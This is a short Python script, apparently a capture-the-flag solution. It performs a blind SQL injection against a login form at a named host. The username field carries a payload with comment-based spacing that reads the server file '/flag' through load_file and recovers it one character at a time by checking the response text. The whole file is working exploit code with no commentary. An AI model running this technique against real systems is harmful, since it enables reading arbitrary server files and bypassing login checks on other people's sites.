import requests

url = "http://xss.tinmin.top:7777/index.php"
flag = ''
for i in range(2,20):
	for j in range(34,126):
		
		data = {'username':'admin\'/**/&&/**/(insert((select/**/load_file(\'/flag\')),%d,100,\'\')=\'%s\')#'%(i,flag+chr(j)),'password':'lalala'}
		#data = {'username':'admin','password':'tinmin'}
		#print(data)
		#for i in range()
		r = requests.post(url,data=data)
		#print r.text
		if 'Howerver' in r.text:
			flag += chr(j)
			print(flag)
		



